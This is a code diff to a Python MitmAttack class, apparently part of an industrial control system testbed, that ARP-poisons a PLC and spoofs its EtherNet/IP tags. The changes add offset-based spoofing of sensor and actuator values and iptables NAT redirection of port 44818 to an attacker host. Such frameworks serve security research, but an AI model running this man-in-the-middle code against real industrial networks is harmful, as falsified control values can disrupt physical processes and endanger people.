@@ -60,10 +60,9 @@ class MitmAttack(SyncedAttack):
         launch_arp_poison(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
 
     def receive_original_tags(self):
-        target_ip = self.intermediate_plc['local_ip']
         request_tags = self.intermediate_plc['actuators'] + self.intermediate_plc['sensors']
 
-        cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--address', str(target_ip) + ":44818"]
+        cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--print', '--address', str(self.target_plc_ip) + ":44818"]
 
         for tag in request_tags:
             cmd.append(str(tag) + ':1')
@@ -83,7 +82,7 @@ class MitmAttack(SyncedAttack):
             values.pop()
 
             for idx, value in enumerate(values):
-                self.tags[request_tags[idx]] = value.decode()
+                self.tags[request_tags[idx]] = float(value.decode())
 
         except Exception as error:
             print('ERROR enip _receive: ', error)
@@ -96,14 +95,19 @@ class MitmAttack(SyncedAttack):
 
         # Overwrites the tags that we are spoofing
         for tag in self.intermediate_attack['tags']:
-            self.tags[tag['tag']] = tag['value']
+            if 'value' in tag.keys():
+                # Overwrite the value in the dict
+                self.tags[tag['tag']] = tag['value']
+            elif 'offset' in tag.keys():
+                # Offset the value in the dict
+                self.tags[tag['tag']] += tag['offset']
 
         # Release the lock
         self.dict_lock.release()
 
     def make_client_cmd(self) -> List[str]:
         cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--print', '--address',
-               str(self.intermediate_attack['local_ip'])]
+               str(self.attacker_ip)]
 
         # Acquire the lock
         self.dict_lock.acquire()
@@ -136,10 +140,17 @@ class MitmAttack(SyncedAttack):
         restore_arp(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
 
         # Delete iptables rules
+        os.system('iptables -t nat -D PREROUTING -p tcp -d ' + self.target_plc_ip +
+                  ' --dport 44818 -j DNAT --to-destination ' + self.attacker_ip + ':44818')
+
+        os.system('iptables -D PREROUTING -s 192.168.1.1 -j DROP')
+        os.system('iptables -D PREROUTING -d 192.168.1.1 -j DROP')
+
         os.system('iptables -D FORWARD -p icmp -j DROP')
         os.system('iptables -D INPUT -p icmp -j DROP')
         os.system('iptables -D OUTPUT -p icmp -j DROP')
 
+        self.server.terminate()
         self.run_thread = False
         self.thread.join()
 
